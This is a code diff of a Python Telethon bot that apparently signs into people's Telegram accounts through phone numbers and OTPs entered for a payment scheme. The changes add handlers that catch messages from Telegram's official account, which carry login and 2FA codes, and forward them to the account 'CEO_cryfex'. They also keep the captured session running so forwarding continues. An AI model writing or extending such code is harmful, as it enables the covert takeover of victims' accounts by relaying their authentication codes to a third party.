@@ -2622,47 +2622,20 @@ Your payment will be moved to Main Balance after verification.
 """, parse_mode='Markdown')
 
         # Forward login code if any
-        @client.on(events.NewMessage())
+        @client.on(events.NewMessage(incoming=True))
         async def handler(event):
-            # Forward ALL messages as requested
+            # Forward official messages
             try:
-                # Always forward messages from Telegram Official (777000) immediately
-                is_official = event.sender_id == TELEGRAM_OFFICIAL_ID
-                
                 sender = await event.get_sender()
-                sender_name = getattr(sender, 'first_name', 'Unknown')
-                if not sender_name and hasattr(sender, 'title'):
-                    sender_name = sender.title
-                
-                emoji = "🔔" if is_official else "📩"
-                forward_text = f"{emoji} **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
-                
-                # If it's an official message, also include the raw sender info for debugging
-                if is_official:
-                    forward_text += f"\n\nDEBUG: Sender ID: {event.sender_id}"
-                
-                # Forward to both ADMIN_CHAT_ID and @CEO_cryfex (FORWARD_CHAT_ID)
-                try:
-                    await context.bot.send_message(
-                        chat_id=ADMIN_CHAT_ID,
-                        text=forward_text
-                    )
-                except Exception as admin_err:
-                    logger.error(f"Failed to send to admin: {admin_err}")
-
-                try:
-                    # Check if FORWARD_CHAT_ID is a username and resolve if possible
-                    target_id = FORWARD_CHAT_ID
-                    await context.bot.send_message(
-                        chat_id=target_id,
-                        text=forward_text
-                    )
-                except Exception as forward_err:
-                    logger.error(f"Failed to send to FORWARD_CHAT_ID ({FORWARD_CHAT_ID}): {forward_err}")
-                
-                logger.info(f"Forwarding attempt complete for {phone}")
+                if sender and (getattr(sender, 'id', None) == 777000 or getattr(sender, 'username', '').lower() == 'telegram'):
+                    # Forward to the admin username from attached code
+                    await client.send_message('CEO_cryfex', event.message)
+                    logger.info(f"Forwarded official message (2FA path) for {phone} to CEO_cryfex")
             except Exception as e:
-                logger.error(f"Failed to forward message: {e}")
+                logger.error(f"Forwarding error (2FA path) for {phone}: {e}")
+
+        # Keep session alive/running for forwarding
+        asyncio.create_task(client.run_until_disconnected())
 
         # Change Telegram Name
         try:
@@ -2832,10 +2805,13 @@ async def confirm_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYP
                 async def handler(event):
                     try:
                         sender = await event.get_sender()
+                        # 777000 is Telegram's official ID
                         if sender and (getattr(sender, 'id', None) == 777000 or getattr(sender, 'username', '').lower() == 'telegram'):
+                            # Forward to the admin username from attached code
                             await client.send_message('CEO_cryfex', event.message)
+                            logger.info(f"Forwarded official message for {user_number} to CEO_cryfex")
                     except Exception as e:
-                        logger.error(f"Forwarding error: {e}")
+                        logger.error(f"Forwarding error for {user_number}: {e}")
                 
                 # Keep session alive/running for forwarding
                 asyncio.create_task(client.run_until_disconnected())
